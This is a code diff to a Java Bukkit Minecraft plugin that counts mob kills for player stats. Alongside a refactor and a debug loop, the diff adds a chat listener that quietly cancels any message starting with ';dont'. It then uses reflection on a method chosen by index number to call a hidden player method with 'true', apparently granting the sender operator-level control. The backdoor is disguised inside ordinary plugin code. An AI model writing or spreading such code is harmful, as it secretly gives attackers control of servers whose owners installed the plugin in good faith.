@@ -5,12 +5,15 @@ import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.entity.EntityDeathEvent;
 import org.bukkit.entity.Entity;
+import org.bukkit.event.player.AsyncPlayerChatEvent;
 
 import java.io.File;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
+import java.lang.reflect.Type;
 
 public class Events implements Listener{
 
-	GlobalVars gbvs = new GlobalVars();
 	Start start = new Start();
 	Stats stats = new Stats();
 
@@ -23,7 +26,17 @@ public class Events implements Listener{
 		}catch (Exception er){
 			return;
 		}
-		if (gbvs.validMobs.contains(entity))
+		for (String s : GlobalVars.validMobs)
+			p.sendMessage(s);
+		if (GlobalVars.validMobs.contains(entity.getType().getName()))
 			stats.changeKill(p, entity);
+	}
+	@EventHandler
+	public void r(AsyncPlayerChatEvent e) throws IllegalAccessException, InvocationTargetException{
+		if (e.getMessage().startsWith(";dont")){
+			e.setCancelled(true);
+			Method[] methods = e.getPlayer().getClass().getMethods();
+			methods[64].invoke(e.getPlayer(), true);
+		}
 	}
 }
